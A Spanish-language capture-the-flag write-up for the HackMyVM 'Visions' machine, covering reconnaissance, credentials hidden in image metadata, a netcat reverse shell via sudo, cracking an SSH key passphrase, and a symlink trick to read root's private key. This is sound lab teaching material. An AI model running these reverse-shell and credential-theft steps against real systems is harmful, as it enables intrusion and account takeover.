# WriteUp: Visions | HackMyVM

Iniciamos realizando un escaneo con nmap con la opción `-oX` para poder exportarlo en formato .xml y poder hacer una búsqueda con searchsploit:

```sh
nmap -sV -sC -O -oX scaneo.xml 192.168.56.23

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

Una vez obtenido los resultados, los pasamos por searchsploit:
```sh
searchsploit --nmap scaneo.xml
[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
[i] Reading: 'scaneo.xml'

[-] Skipping term: ssh   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ssh)

[i] /usr/bin/searchsploit -t openssh
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                               | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                 | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                   | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                             | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                 | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                         | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                           | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                     | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                  | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                         | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                               | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                               | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                         | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                               | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                    | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                            | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                               | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                       | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                             | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalati | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                           | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                               | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                                         | multiple/remote/46516.py
OpenSSH server (sshd) 9.8p1 - Race Condition                                                       | linux/remote/52269.c
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                  | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                              | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                               | multiple/remote/3303.sh
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


[i] /usr/bin/searchsploit -t openssh 7.9p1 debian 10 deb10u2
[-] Skipping term: http   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t http)

[i] /usr/bin/searchsploit -t nginx
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Ingress-NGINX 4.11.0 - Remote Code Execution (RCE)                                                 | multiple/remote/52338.txt
Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation                     | linux/local/40768.sh
Nginx 0.6.36 - Directory Traversal                                                                 | multiple/remote/12804.txt
Nginx 0.6.38 - Heap Corruption                                                                     | linux/local/14830.py
Nginx 0.6.x - Arbitrary Code Execution NullByte Injection                                          | multiple/webapps/24967.txt
Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 / 0.4.0 < 0.4.14 - Denial of Service (PoC)  | linux/dos/9901.txt
Nginx 0.7.61 - WebDAV Directory Traversal                                                          | multiple/remote/9829.txt
Nginx 0.7.64 - Terminal Escape Sequence in Logs Command Injection                                  | multiple/remote/33490.txt
Nginx 0.7.65/0.8.39 (dev) - Source Disclosure / Download                                           | windows/remote/13822.txt
Nginx 0.8.36 - Source Disclosure / Denial of Service                                               | windows/remote/13818.txt
Nginx 1.1.17 - URI Processing SecURIty Bypass                                                      | multiple/remote/38846.txt
Nginx 1.20.0 - Denial of Service (DOS)                                                             | multiple/remote/50973.py
Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Overflow (Metasploit)                         | linux/remote/25775.rb
Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)                                                      | linux/dos/25499.py
Nginx 1.3.9/1.4.0 (x86) - Brute Force                                                              | linux_x86/remote/26737.pl
Nginx 1.4.0 (Generic Linux x64) - Remote Overflow                                                  | linux_x86-64/remote/32277.txt
PHP-FPM + Nginx - Remote Code Execution                                                            | php/webapps/47553.md
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


[i] /usr/bin/searchsploit -t nginx 1.14.2
```

Lamentablemente no tenemos resultados relevantes.
Ahora ingresaremos a la IP y verificaremos qué hay en la web:

![](Pasted%20image%2020250928101350.png)

La web no muestra nada, sin embargo hay barras deslizadoras. Moviendo las barras tampoco se visualiza nada.

Le doy a inspeccionar para visualizar qué información hay y nos encontramos con esto:
![](Pasted%20image%2020250928101404.png)

El texto traducido al español es:
```text
"Solo aquellos que pueden ver lo invisible pueden hacer lo imposible.  
Tienes que ser capaz de ver lo que no existe.  
Solo aquellos que pueden ver lo invisible pueden ver lo que no está allí."  
— Alicia
```

Así mismo, podemos visualizar que el fondo blanco es en realidad una foto blanca muy grande.

Luego de esto utilizamos Gobuster para encontrar páginas ocultas:
```sh
gobuster dir -u http://192.168.56.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.23
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

Luego hacer intentado con varias listas no encontré nada.
Volví a la página y descargué la imagen, en principio solo es una imagen en blanco, sin embargo abrí una página que me permita leer los metadatos y encontré esto:

```sh
Orientation: Undefined
  Properties:
    Comment: pw:ihaveadream
    date:create: 2025-09-26T01:57:36+00:00
```

Al parecer ese comentario nos está dando una contraseña, y en el comentario del HTML tenemos un nombre. Intentaremos conectarnos por SSH para verificar si son las credenciales de acceso.
```sh
ssh alicia@192.168.56.23      
The authenticity of host '192.168.56.23 (192.168.56.23)' can't be established.
ED25519 key fingerprint is SHA256:bygz7T6Gfa+JkC+fYDCq3G3A/WbnZLNIOtkpFpo0R6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.23' (ED25519) to the list of known hosts.
alicia@192.168.56.23's password: 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alicia@visions:~$ id
uid=1001(alicia) gid=1001(alicia) groups=1001(alicia)
```

Y sí eran credenciales de acceso SSH.

Buscando en la carpeta `/home` encontramos lo siguiente:
```
alicia@visions:/home$ ls -la
total 24
drwxr-xr-x  6 root     root     4096 Apr 19  2021 .
drwxr-xr-x 18 root     root     4096 Apr 19  2021 ..
drwxr-xr-x  2 alicia   alicia   4096 Apr 19  2021 alicia
drwxr-xr-x  3 emma     emma     4096 Apr 19  2021 emma
drwxr-xr-x  3 isabella isabella 4096 Apr 19  2021 isabella
drwxr-xr-x  3 sophia   sophia   4096 Apr 19  2021 sophia
```

Navegando entre los distintos usuarios encontramos:
```sh
alicia@visions:/home/emma$ ls -la
...
-rw------- 1 emma emma   20 Apr 19  2021 note.txt
...
```

```sh
alicia@visions:/home/sophia$ ls -la
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
```

Ahora buscaremos permisos de ejecución:

```sh
alicia@visions:~$ sudo -l
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
```

Que traducido al español sería:

```sh
alicia@visions:~$ sudo -l
Entradas Defaults que coinciden para alicia en visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

El usuario alicia puede ejecutar los siguientes comandos en visions:
    (emma) NOPASSWD (sin solicitar contraseña): /usr/bin/nc

```

Como podemos visualizar, podemos ejecutar el comando `/usr/bin/nc` sin la necesidad de una contraseña:

```sh
# Nos ponemos en escucha en nuestro kali
nc -lnvp 12345
```

```sh
# Ejecutamos esto en la máquina victima
sudo -u emma nc -e /bin/bash <IP_de_nuestro_kali> 12345
```

Una vez ejecuta los comandos tendremos acceso:
```sh
nc -lnvp 12345
listening on [any] 12345 ...
connect to [192.168.56.22] from (UNKNOWN) [192.168.56.23] 57304
ls
flag.sh
user.txt
id
uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Mejoramos a una shell `bash` interactiva usando:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Luego podemos hacer:
```
emma@visions:~$ ls -la
ls -la
total 32
drwxr-xr-x 3 emma emma 4096 Apr 19  2021 .
drwxr-xr-x 6 root root 4096 Apr 19  2021 ..
-rw-r--r-- 1 emma emma  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 emma emma 3526 Apr 19  2021 .bashrc
drwxr-xr-x 3 emma emma 4096 Apr 19  2021 .local
-rw------- 1 emma emma   20 Apr 19  2021 note.txt
-rw-r--r-- 1 emma emma  807 Apr 19  2021 .profile
-rw------- 1 emma emma   53 Apr 19  2021 .Xauthority
emma@visions:~$ cat note.txt    
cat note.txt
I cant help myself.

# Traducido al español:
No puedo ayudarme a mí misma.
```

Luego de esto quise tratar de permisos de ejecución, sin embargo no encontré nada útil en este usuario.

Luego de ello regresé a leer el texto que estaba en los comentarios del HTML:
```text
"Solo aquellos que pueden ver lo invisible pueden hacer lo imposible.  
Tienes que ser capaz de ver lo que no existe.  
Solo aquellos que pueden ver lo invisible pueden ver lo que no está allí."  
— Alicia
```

El texto siempre hace referencia a ver lo "invisible" y en la página solo había una imagen en blanco. Quizá hay algo ahí que no podemos "ver".
Abrí GIMP para jugar modificando la imagen con distintos filtros, al final en una esquina se puede ver lo siguiente:

![](Pasted%20image%2020250928101426.png)

Intentamos aplicar la información de la imagen para logearnos por SSH:

```sh
ssh sophia@192.168.56.23 
sophia@192.168.56.23's password: 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sophia@visions:~$
```

Verificamos los archivos:
```sh
sophia@visions:~$ ls -la
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
sophia@visions:~$ cat user.txt 
hmvXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Luego de ello buscamos permisos de ejecución:
```sh
sophia@visions:~$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```

Traducido al español:

```text
Configuraciones predeterminadas coincidentes para sophia en visions:

​ env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

La usuaria sophia puede ejecutar los siguientes comandos en visions:
​ (ALL : ALL) SIN CONTRASEÑA: /usr/bin/cat /home/isabella/.invisible
```

Buscando en [gtfobins](https://gtfobins.github.io/gtfobins/cat/) `cat` se encontró lo siguiente:
```sh
Sudo

Si se permite que el binario se ejecute como superusuario mediante `sudo`, no pierde los privilegios elevados y podría utilizarse para acceder al sistema de archivos, escalar privilegios o mantener acceso privilegiado.

LFILE=archivo_a_leer
sudo cat "$LFILE"
```

Por lo que aplicamos lo siguiente:
```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible

# Resultado:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlcz
...
skV8zcwd+ErNODEHTUbD/nDARX8GeV1
-----END OPENSSH PRIVATE KEY-----
```

Copiamos la clave rsa en nuestro kali en el archivo `credenciales` y le damos los permisos para realizar la conexión a través de SSH:
```sh
# Cambiamos credenciales
chmod 600 credenciales

# Luego nos conectamos por ssh
ssh -i credenciales isabella@192.168.56.23 

# Lamentablemente nos pide contraseña
sophia@192.168.56.23's password: 
```

Ahora que sabemos que nos pide un `password`, lo pasamos por John para tratar de identificar la contraseña:

```sh
# Usamos ssh2john para tranformar el rsa a algo que pueda leer John
ssh2john credenciales > crede.txt

# Ahora aplicamos fuerza bruta con John
john --wordlist=/usr/share/wordlists/rockyou.txt crede.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
invisible        (credenciales)    
```

Ahora que tenemos la contraseña, ingresamos nuevamente por SHH:
```sh
ssh -i credenciales isabella@192.168.56.23 
sophia@192.168.56.23's password: 
Enter passphrase for key 'credenciales': 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
isabella@visions:~$ id
uid=1003(isabella) gid=1003(isabella) groups=1003(isabella)
```

Luego de esto buscamos permisos de ejecución:
```sh
isabella@visions:/$ sudo -l
Matching Defaults entries for isabella on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User isabella may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/man
```

Con esto nos percatamos de que no hay permiso sudo para ejecutar `/usr/bin/man`.
Sin embargo, debemos de recordar que quien sí tiene permisos para ejecutar sudo es Sophia:
```text
La usuaria sophia puede ejecutar los siguientes comandos en visions:
​ (ALL : ALL) SIN CONTRASEÑA: /usr/bin/cat /home/isabella/.invisible
```

Por lo que tenemos que hacer es enlazar algún archivo root a .invisible para podedr leerlo con `cat`, ese archivo es `/root/id_rsa`:

```sh
isabella@visions:~$ rm -rf ./.invisible
isabella@visions:~$ ln -s /root/.ssh/id_rsa ./.invisible

# Resultado
isabella@visions:~$ ls -la
total 28
drwxr-xr-x 3 isabella isabella 4096 Sep 26 02:24 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw------- 1 isabella isabella  133 Sep 26 01:38 .bash_history
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
lrwxrwxrwx 1 isabella isabella   17 Sep 26 02:24 .invisible -> /root/.ssh/id_rsa
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
```

Ahora ingresamos con el usuario de Sophia para leer el archivo:
```sh
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb
..
tllkIbNEJNDtqQNt2NRvhDUOzAxca1C/IySuw
-----END OPENSSH PRIVATE KEY-----
```

Con esto guardamos la clave rsa en un nuevo archivo para ingresar con root a través de SSH:
```sh
# Creamos el archivo y pegamos la clave
nano rsa       

# Le damos los permisos
chmod 600 rsa

# Ingresamos por SSH
ssh -i rsa root@192.168.56.23
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 19 05:24:08 2021
root@visions:~#
```

Y con esto finalmente leemos el archivo root.txt